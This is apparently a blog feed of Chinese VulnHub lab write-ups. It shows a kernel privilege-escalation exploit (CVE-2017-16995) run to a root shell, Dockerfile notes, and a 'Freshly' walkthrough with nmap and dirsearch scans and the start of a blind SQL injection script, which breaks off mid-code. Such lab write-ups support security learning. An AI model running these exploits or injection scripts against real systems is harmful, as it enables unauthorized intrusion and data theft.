Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation<br>      URL: https://www.exploit-db.com/exploits/45010<br>     Path: /usr/share/exploitdb/exploits/linux/local/45010.c<br>    Codes: CVE-2017-16995<br> Verified: True<br>File Type: C <span class="hljs-built_in">source</span>, ASCII text<br>Copied to: /home/kali/Downloads/loly/45010.c<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">loly@ubuntu:/tmp$ gcc 45010.c -o 45010  <br>gcc 45010.c -o 45010<br>loly@ubuntu:/tmp$ ./45010  <br>./45010<br>[.] <br>[.] t(-_-t) exploit <span class="hljs-keyword">for</span> counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)<br>[.] <br>[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **<br>[.] <br>[*] creating bpf map<br>[*] sneaking evil bpf past the verifier<br>[*] creating socketpair()<br>[*] attaching bpf backdoor to socket<br>[*] skbuff =&gt; ffff8800742c2500<br>[*] Leaking sock struct from ffff880079da3fc0<br>[*] Sock-&gt;sk_rcvtimeo at offset 472<br>[*] Cred structure at ffff88007805ef00<br>[*] UID from cred structure: 1000, matches the current: 1000<br>[*] hammering cred structure at ffff88007805ef00<br>[*] credentials patched, launching shell...<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(loly)<br><span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux ubuntu 4.4.0-31-generic <span class="hljs-comment">#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>root.txt<br><span class="hljs-comment"># cat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br>  ____               ____ ____  ____  <br> / ___| _   _ _ __  / ___/ ___||  _ \ <br> \___ \| | | | <span class="hljs-string">&#x27;_ \| |   \___ \| |_) |</span><br><span class="hljs-string">  ___) | |_| | | | | |___ ___) |  _ &lt; </span><br><span class="hljs-string"> |____/ \__,_|_| |_|\____|____/|_| \_\</span><br><span class="hljs-string">                                      </span><br><span class="hljs-string">Congratulations. I&#x27;</span>m BigCityBoy<br></code></pre></td></tr></table></figure><p>关于选择 exp 上，可以结合 searchploit 和 linpeas 的推荐综合考虑</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最折磨的地方还是内核提权的过程，这方面感觉没什么很好地方法，只能</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Dockerfile 编写</title>
    <link href="/2023/08/b74afd49612e.html"/>
    <url>/2023/08/b74afd49612e.html</url>
    
    <content type="html"><![CDATA[<h1 id="Dockerfile-编写"><a href="#Dockerfile-编写" class="headerlink" title="Dockerfile 编写"></a>Dockerfile 编写</h1><h2 id="Dockerfile-指令集"><a href="#Dockerfile-指令集" class="headerlink" title="Dockerfile 指令集"></a>Dockerfile 指令集</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> 指定基础镜像<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> 其后跟着编写的shell 执行</span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash">/CPOY 将宿主机文件拷贝到容器中，ADD拷贝压缩包时会自动解压</span><br><br>WORKERDIR 相当于cd，指定目录不存在时会自动创建<br><br>VOLUMN 挂载主机目录<br><br><span class="hljs-keyword">EXPOSE</span> 指定对外端口<br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> 镜像启动成容器的时候，所运行的指令（只有最后一个CMD在启动时生效）</span><br></code></pre></td></tr></table></figure><h2 id="单阶段构建镜像"><a href="#单阶段构建镜像" class="headerlink" title="单阶段构建镜像"></a>单阶段构建镜像</h2>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>technique</category>
      
      <category>docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Freshly 靶机</title>
    <link href="/2023/08/837eac51f5d4.html"/>
    <url>/2023/08/837eac51f5d4.html</url>
    
    <content type="html"><![CDATA[<h1 id="Freshly-靶机"><a href="#Freshly-靶机" class="headerlink" title="Freshly 靶机"></a>Freshly 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.136       <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 11:55 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.136<br>Host is up (0.00033s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>443/tcp  open  https<br>8080/tcp open  http-proxy<br>MAC Address: 08:00:27:AD:0D:F7 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.20 seconds<br></code></pre></td></tr></table></figure><p>开放了 80, 443, 8080 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p80,443,8080 192.168.56.136<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 11:56 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.136<br>Host is up (0.00046s latency).<br><br>PORT     STATE SERVICE  VERSION<br>80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">443/tcp  open  ssl/http Apache httpd</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=www.example.com</span><br><span class="hljs-string">| Not valid before: 2015-02-17T03:30:05</span><br><span class="hljs-string">|_Not valid after:  2025-02-14T03:30:05</span><br><span class="hljs-string">|_http-title: 400 Bad Request</span><br><span class="hljs-string">|_http-server-header: Apache</span><br><span class="hljs-string">8080/tcp open  http     Apache httpd</span><br><span class="hljs-string">|_http-title: Site doesn\&#x27;</span>t have a title (text/html).<br>|_http-server-header: Apache<br>MAC Address: 08:00:27:AD:0D:F7 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.64 seconds<br></code></pre></td></tr></table></figure><p>Ubuntu 操作系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p80,443,8080 192.168.56.136 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 11:56 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.136<br>Host is up (0.00045s latency).<br><br>PORT     STATE SERVICE<br>80/tcp   open  http<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server\&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       http://ha.ckers.org/slowloris/<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>| http-enum: <br>|   /login.php: Possible admin folder<br>|_  /phpmyadmin/: phpMyAdmin<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>443/tcp  open  https<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-cookie-flags: </span><br><span class="hljs-string">|   /wordpress/: </span><br><span class="hljs-string">|     PHPSESSID: </span><br><span class="hljs-string">|       secure flag not set and HTTPS in use</span><br><span class="hljs-string">|_      httponly flag not set</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /wordpress/: Blog</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.136<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: https://192.168.56.136:443/wordpress/<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: https://192.168.56.136:443/wordpress/<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/<br>|     Form <span class="hljs-built_in">id</span>: commentform<br>|     Form action: https://192.168.56.136:443/wordpress/wp-comments-post.php<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/store/cart/<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: https://192.168.56.136:443/wordpress/<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/store/express/<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: https://192.168.56.136:443/wordpress/<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/store/receipt/<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: https://192.168.56.136:443/wordpress/<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/store/checkout/<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: https://192.168.56.136:443/wordpress/<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/store/<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: https://192.168.56.136:443/wordpress/<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/store/<br>|     Form <span class="hljs-built_in">id</span>: cartbuttonform_2<br>|     Form action: https://192.168.56.136:443/wordpress/store/cart/<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/store/<br>|     Form <span class="hljs-built_in">id</span>: cartbuttonform_1<br>|     Form action: https://192.168.56.136:443/wordpress/store/cart/<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/store/ipn/<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: https://192.168.56.136:443/wordpress/<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: https://192.168.56.136:443/wordpress/<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/<br>|     Form <span class="hljs-built_in">id</span>: commentform<br>|     Form action: https://192.168.56.136:443/wordpress/wp-comments-post.php<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/store/cart/<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: https://192.168.56.136:443/wordpress/<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/store/express/<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: https://192.168.56.136:443/wordpress/<br>|     <br>|     Path: https://192.168.56.136:443/wordpress/store/receipt/<br>|     Form <span class="hljs-built_in">id</span>: <br>|_    Form action: https://192.168.56.136:443/wordpress/<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server\<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">8080/tcp open  http-proxy</span><br><span class="hljs-string">| http-cookie-flags: </span><br><span class="hljs-string">|   /wordpress/: </span><br><span class="hljs-string">|     PHPSESSID: </span><br><span class="hljs-string">|       httponly flag not set</span><br><span class="hljs-string">|   /wordpress/wp-login.php: </span><br><span class="hljs-string">|     PHPSESSID: </span><br><span class="hljs-string">|_      httponly flag not set</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /wordpress/: Blog</span><br><span class="hljs-string">|   /wordpress/wp-login.php: Wordpress login page.</span><br><span class="hljs-string">|_  /img/: Potentially interesting folder w/ directory listing</span><br><span class="hljs-string">MAC Address: 08:00:27:AD:0D:F7 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 353.41 seconds</span><br></code></pre></td></tr></table></figure><p>有价值的信息主要都是目录</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>那就8080 和 80 端口着重测试，先进行目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo dirsearch -u http://192.168.56.136              <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.136/_23-08-20_12-16-46.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-08-20_12-16-46.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.136/<br><br>[12:16:46] Starting: <br>[12:16:47] 403 -  292B  - /.ht_wsr.txt                                     <br>[12:16:47] 403 -  295B  - /.htaccess.bak1                                  <br>[12:16:47] 403 -  295B  - /.htaccess.orig<br>[12:16:47] 403 -  297B  - /.htaccess.sample<br>[12:16:47] 403 -  293B  - /.htaccessBAK<br>[12:16:47] 403 -  295B  - /.htaccess.save<br>[12:16:47] 403 -  293B  - /.htaccessOLD<br>[12:16:47] 403 -  295B  - /.htaccess_orig<br>[12:16:47] 403 -  293B  - /.htaccess_sc<br>[12:16:47] 403 -  294B  - /.htaccessOLD2<br>[12:16:47] 403 -  296B  - /.htaccess_extra<br>[12:16:47] 403 -  285B  - /.htm<br>[12:16:47] 403 -  286B  - /.html<br>[12:16:47] 403 -  291B  - /.htpasswds                                      <br>[12:16:47] 403 -  292B  - /.httr-oauth<br>[12:16:47] 403 -  295B  - /.htpasswd_test                                  <br>[12:16:48] 403 -  286B  - /.php3                                           <br>[12:16:48] 403 -  285B  - /.php                                            <br>[12:17:04] 200 -   47B  - /index.html                                       <br>[12:17:04] 301 -  320B  - /javascript  -&gt;  http://192.168.56.136/javascript/<br>[12:17:05] 200 -  276B  - /login.php                                        <br>[12:17:09] 301 -  320B  - /phpmyadmin  -&gt;  http://192.168.56.136/phpmyadmin/<br>[12:17:10] 200 -    8KB - /phpmyadmin/                                      <br>[12:17:10] 200 -    8KB - /phpmyadmin/index.php                             <br>[12:17:13] 403 -  294B  - /server-status                                    <br>[12:17:13] 403 -  295B  - /server-status/<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo dirsearch -u http://192.168.56.136:8080<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.136-8080/_23-08-24_10-08-36.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-08-24_10-08-36.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.136:8080/<br><br>[10:08:36] Starting: <br>[10:08:37] 403 -  220B  - /.ht_wsr.txt                                     <br>[10:08:37] 403 -  223B  - /.htaccess.bak1                                  <br>[10:08:37] 403 -  223B  - /.htaccess.orig<br>[10:08:37] 403 -  224B  - /.htaccess_extra<br>[10:08:37] 403 -  223B  - /.htaccess.save<br>[10:08:37] 403 -  225B  - /.htaccess.sample<br>[10:08:37] 403 -  223B  - /.htaccess_orig<br>[10:08:37] 403 -  221B  - /.htaccess_sc<br>[10:08:37] 403 -  221B  - /.htaccessOLD<br>[10:08:37] 403 -  221B  - /.htaccessBAK<br>[10:08:37] 403 -  222B  - /.htaccessOLD2                                   <br>[10:08:37] 403 -  214B  - /.html<br>[10:08:37] 403 -  213B  - /.htm<br>[10:08:37] 403 -  220B  - /.httr-oauth<br>[10:08:37] 403 -  223B  - /.htpasswd_test                                  <br>[10:08:37] 403 -  219B  - /.htpasswds<br>[10:08:39] 403 -  218B  - /.user.ini                                        <br>[10:08:54] 200 -    1KB - /favicon.ico                                      <br>[10:08:56] 301 -  239B  - /img  -&gt;  http://192.168.56.136:8080/img/         <br>[10:08:56] 200 -    3KB - /index.html                                       <br>[10:09:12] 200 -    6KB - /wordpress/wp-login.php                           <br>[10:09:13] 200 -   16KB - /wordpress/<br></code></pre></td></tr></table></figure><p>对 80 端口界面的登录框进行 fuzz（太简陋了感觉可能存在 SQL 注入）</p><p><img src="/pic/748f60d0deda075edb9658f965ec8158_MD5.png"></p><p>比想象中的简单，看来是盲注</p><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>自己手动用二分法判断 ascii 码，进行了半天，着实难受</p><p>参考了这篇文章，修改成了以下脚本：<a href="https://www.cnblogs.com/cainiao-chuanqi/p/15736782.html">SQL盲注二分法注入脚本 - 菜鸟-传奇 - 博客园 (cnblogs.com)</a></p><p>修改的思路主要是对 payload 和判断条件进行调整，并且为了方便自己以后使用，加入了用户交互的部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*-coding:utf-8-*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>host = <span class="hljs-string">&quot;http://192.168.56.136/login.php&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTable</span>(): <span class="hljs-comment">#获取表名</span><br>    <span class="hljs-keyword">global</span> host<br>    ans=<span 